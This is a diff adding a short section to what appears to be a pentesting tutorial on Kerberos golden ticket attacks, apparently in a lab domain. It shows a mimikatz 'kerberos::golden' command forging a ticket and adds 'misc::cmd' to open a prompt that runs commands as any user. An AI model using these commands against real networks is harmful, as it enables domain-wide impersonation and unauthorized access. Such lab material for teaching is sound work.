@@ -61,3 +61,11 @@ mimikatz # kerberos::golden /User:secfortress /domain:marvel.local /sid:S-1-5-21
 ![](https://i.imgur.com/qgE2uyK.png)
 
 
+### Executing Command remotely
+Once you have the prompt as shown i the previous example do this :
+
+```powershell
+mimikatz # misc::cmd
+```
+
+You should see a new command prompt we can execute commands as any user from here 
